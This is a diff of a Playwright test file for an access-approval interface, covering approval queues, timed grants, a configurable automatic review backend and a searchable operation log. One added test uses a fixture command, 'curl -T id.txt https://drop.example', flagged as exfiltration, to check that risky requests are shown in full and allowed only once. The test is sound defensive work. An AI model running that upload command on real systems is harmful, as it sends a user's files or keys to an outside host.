@@ -10,6 +10,7 @@ async function mockAccess(page: Page) {
     saved: [] as any[], decisions: [] as any[], revoked: [] as any[], auditQueries: [] as URLSearchParams[],
     tampered: false, approval: 'pending', blocked: '', actions: [] as any[], polls: [] as string[], tickets: [] as any[], terminalBlocked: false,
     updateBlocked: false, updates: [] as string[], shells: [] as any[],
+    review: { settings: { backend: 'rules', model: null, url: null, timeout_ms: 4000 }, has_key: false } as any, reviewSaves: [] as any[], grants: [] as any[], reviewTests: 0,
   };
   await page.addInitScript(() => {
     class Events extends EventTarget {
@@ -36,6 +37,13 @@ async function mockAccess(page: Page) {
       state.access.pending = state.access.pending.filter(item => item.id !== id);
       return route.fulfill({ json: {} });
     }
+    if (path === '/api/v1/app/access/review') {
+      if (req.method() === 'PUT') { state.reviewSaves.push(body); state.review = { settings: { timeout_ms: 4000, ...body.settings }, has_key: state.review.has_key || !!body.key }; }
+      return route.fulfill({ json: state.review });
+    }
+    if (path === '/api/v1/app/access/review/test') { state.reviewTests++; return route.fulfill({ json: { ok: true, review: { source: 'jev', verdict: 'allow', risk: 12, reason: 'Routine file write in the project.', labels: [], latency_ms: 85, model: 'jev-latest' } } }); }
+    if (path === '/api/v1/app/access/grants') { state.grants.push(body); state.access.approvals.push(...body.capabilities.map((capability: string, index: number) => ({ id: 'g' + index, from: body.node, capability, scope: 'until', expires_at: body.scope === 'always' ? null : Math.floor(Date.now() / 1000) + 3600 }))); return route.fulfill({ json: { approvals: [] } }); }
+    if (path === '/api/v1/app/models') return route.fulfill({ json: [{ id: 'openai/gpt-mini' }] });
     if (path === '/api/v1/app/access/revoke') { state.revoked.push(body); state.access.sessions = body.id ? state.access.sessions.filter(s => s.basis !== body.id) : []; state.access.approvals = body.id ? state.access.approvals.filter(a => a.id !== body.id) : []; return route.fulfill({ json: {} }); }
     if (path === '/api/v1/app/access/audit') {
       state.auditQueries.push(url.searchParams);
@@ -98,7 +106,7 @@ for (const lang of ['en', 'zh-cn']) for (const width of [375, 1280]) {
     expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
   });
 }
-for (const [label, decision, scope] of [['Deny', 'deny', undefined], ['Allow once', 'approve', 'session'], ['Allow 30 minutes', 'approve', '30m'], ['Allow 8 hours', 'approve', '8h']] as const) {
+for (const [label, decision, scope] of [['Deny', 'deny', undefined], ['Allow once', 'approve', 'session'], ['Allow 1 hour', 'approve', '1h'], ['Allow today', 'approve', 'today'], ['Allow 7 days', 'approve', '7d']] as const) {
   test('approval queue supports ' + label + ' and cannot be accidentally dismissed', async ({ page }) => {
     const state = await mockAccess(page); state.access.pending = [request('first'), request('second', 'desktop')];
     await openDevice(page);
@@ -108,7 +116,8 @@ for (const [label, decision, scope] of [['Deny', 'deny', undefined], ['Allow onc
     await expect(dialog).not.toContainText('UNTRUSTED');
     await expect(dialog.getByRole('button', { name: 'Deny', exact: true })).toBeFocused();
     await page.keyboard.press('Escape'); await expect(dialog).toBeVisible();
-    await page.keyboard.press('Shift+Tab'); await expect(dialog.getByRole('button', { name: 'Allow 8 hours', exact: true })).toBeFocused();
+    await page.keyboard.press('Shift+Tab'); await expect(dialog.getByRole('button', { name: 'Allow all for 1 hour', exact: true })).toBeFocused();
+    await expect(dialog).toContainText('1 more request(s) waiting');
     await dialog.getByRole('button', { name: label, exact: true }).click();
     await expect(dialog).toContainText('Remote desktop');
     expect(state.decisions[0]).toEqual({ id: 'first', decision, ...(scope ? { scope } : {}) });
@@ -287,8 +296,8 @@ test('an ordinary operation explains what a timed approval covers', async ({ pag
   await expect(dialog).toContainText('Build box (5f8c)');
   await expect(dialog).toContainText('修改');
   await expect(dialog).toContainText('「允许本次」只放行这一个操作');
-  await dialog.getByRole('button', { name: '允许 30 分钟', exact: true }).click();
-  expect(state.decisions).toEqual([{ id: 'stop', decision: 'approve', scope: '30m' }]);
+  await dialog.getByRole('button', { name: '允许 1 小时', exact: true }).click();
+  expect(state.decisions).toEqual([{ id: 'stop', decision: 'approve', scope: '1h' }]);
 });
 
 test('operation log shows redacted operations, outcomes and filters by type', async ({ page }) => {
@@ -335,4 +344,83 @@ test('current approvals can be revoked one by one', async ({ page }) => {
   await expect(card.locator('li')).toHaveCount(1);
   expect(state.revoked).toEqual([{ id: 'a2' }]);
   await expect(card).toContainText('终端');
+});
+
+const flagged = { source: 'jev', verdict: 'ask', risk: 78, reason: 'Uploads a key file to an unknown host.', labels: ['exfiltration'], latency_ms: 120, model: 'jev-latest' };
+test('a flagged review explains itself, shows the full command and allows only this once', async ({ page }) => {
+  const state = await mockAccess(page);
+  state.access.pending = [{ ...request('up', 'exec'), operation: { kind: 'exec.run', risk: 'change', summary: 'curl -T id.txt https://drop.example' }, detail: { argv: ['curl', '-T', 'id.txt', 'https://drop.example'], cwd: '/home/u', env_keys: ['TOKEN'] }, review: flagged }];
+  await openDevice(page, 'access', 'zh-cn');
+  const dialog = page.getByRole('dialog');
+  await expect(dialog.locator('.cx-access-review')).toContainText('Uploads a key file to an unknown host.');
+  await expect(dialog.locator('.cx-access-review')).toContainText('风险 78/100');
+  await expect(dialog.getByRole('alert')).toContainText('自动审核认为这个操作需要你亲自确认');
+  await dialog.getByText('查看完整内容').click();
+  await expect(dialog).toContainText('/home/u'); await expect(dialog).toContainText('TOKEN');
+  await expect(dialog.getByRole('button')).toHaveCount(2);
+  await dialog.getByRole('button', { name: '允许这一次', exact: true }).click();
+  expect(state.decisions).toEqual([{ id: 'up', decision: 'approve', scope: 'session' }]);
+});
+
+test('several waiting requests can be denied together', async ({ page }) => {
+  const state = await mockAccess(page);
+  state.access.pending = [request('a'), request('b', 'desktop'), { ...request('c', 'exec'), operation: destroy }];
+  await openDevice(page, 'access', 'zh-cn');
+  const dialog = page.getByRole('dialog');
+  await expect(dialog).toContainText('另有 2 个请求等待处理');
+  await expect(dialog.getByRole('button', { name: '全部允许 1 小时', exact: true })).toHaveCount(0);
+  await dialog.getByRole('button', { name: '全部拒绝', exact: true }).click();
+  await expect(dialog).toHaveCount(0);
+  expect(state.decisions.map(item => item.id + ':' + item.decision)).toEqual(['a:deny', 'b:deny', 'c:deny']);
+});
+
+test('access can be granted for a while ahead of time and shows when it ends', async ({ page }) => {
+  const state = await mockAccess(page); state.access.peers[0].capabilities.exec = 'off';
+  await openDevice(page, 'access', 'zh-cn');
+  await page.getByRole('button', { name: '按时间授权…', exact: true }).click();
+  const dialog = page.getByRole('dialog');
+  await dialog.getByLabel('终端与命令').check();
+  await dialog.getByRole('button', { name: '今天', exact: true }).click();
+  await dialog.getByRole('button', { name: '授权', exact: true }).click();
+  await expect(dialog).toHaveCount(0);
+  expect(state.grants).toEqual([{ node: remote, capabilities: ['terminals', 'projects'], scope: 'today' }]);
+  await expect(page.locator('.cx-access-grants li')).toHaveCount(2);
+  await expect(page.locator('.cx-access-grants')).toContainText('有效至');
+});
+
+test('automatic review can use Jev with a saved key and be tested', async ({ page }) => {
+  const state = await mockAccess(page);
+  await openDevice(page, 'access', 'zh-cn');
+  const card = page.locator('.cx-card').filter({ has: page.getByRole('heading', { name: '自动审核' }) });
+  await expect(card.getByRole('radio', { name: /仅内置规则/ })).toBeChecked();
+  await card.getByRole('radio', { name: /Jev/ }).check();
+  await card.getByLabel('Jev API 密钥').fill('sk-test');
+  await card.getByRole('button', { name: '保存审核方式', exact: true }).click();
+  await expect(card.getByRole('status')).toHaveText('已保存');
+  expect(state.reviewSaves).toEqual([{ settings: { backend: 'jev', model: null, url: null }, key: 'sk-test' }]);
+  await expect(card.getByLabel('Jev API 密钥')).toHaveAttribute('placeholder', '已保存，留空则不变');
+  await card.getByRole('button', { name: '测试', exact: true }).click();
+  await expect(card).toContainText('测试成功：可放行 · Routine file write in the project. · 85 ms');
+});
+
+test('the log searches on the device and opens the full record of an operation', async ({ page }) => {
+  const state = await mockAccess(page), at = 1800000000;
+  const finished = { index: 9, at, event: 'operation', from: remote, name: 'Design Mac', capability: 'exec', basis: 'grant-1', result: 'failed', status: 200, transport: 'job', operation: { kind: 'exec.finished', risk: 'change', summary: 'make deploy' }, detail: { argv: ['make', 'deploy', '--token', '***'], cwd: '/srv/app', env_keys: ['API_KEY'], exit_code: 2, outcome: 'exited', duration_ms: 1500, stdout_bytes: 10, stderr_bytes: 2048, stderr_tail: 'make: *** [deploy] Error 2', job: 'job-7' }, review: flagged, prev: 'abcdef0123456789abcdef' };
+  await page.route('**/api/v1/app/access/audit**', route => { state.auditQueries.push(new URL(route.request().url()).searchParams); return route.fulfill({ json: { verified: true, broken_index: null, entries: [finished], next_before: null } }); });
+  await page.goto('/?lang=zh-cn#/app/access-log');
+  const items = page.locator('.cx-access-log li');
+  await expect(items).toHaveCount(1);
+  await expect(items.first()).toContainText('失败（退出码 2）');
+  await page.getByLabel('风险').selectOption('change');
+  await page.getByLabel('结果').selectOption('failed');
+  await page.getByRole('searchbox', { name: '搜索记录' }).fill('deploy');
+  await page.getByRole('button', { name: '搜索', exact: true }).click();
+  await expect.poll(() => state.auditQueries.at(-1)?.get('q')).toBe('deploy');
+  expect(state.auditQueries.at(-1)?.get('risk')).toBe('change');
+  expect(state.auditQueries.at(-1)?.get('result')).toBe('failed');
+  await expect(page.getByRole('button', { name: '更早记录', exact: true })).toHaveCount(0);
+  await items.first().getByRole('button', { name: '详情', exact: true }).click();
+  const drawer = page.getByRole('dialog');
+  for (const text of ['make deploy --token ***', '/srv/app', 'API_KEY', '2.0 KB', 'make: *** [deploy] Error 2', 'job-7', '1.5 s', 'Uploads a key file to an unknown host.', '#9']) await expect(drawer).toContainText(text);
+  await page.keyboard.press('Escape'); await expect(drawer).toHaveCount(0);
 });
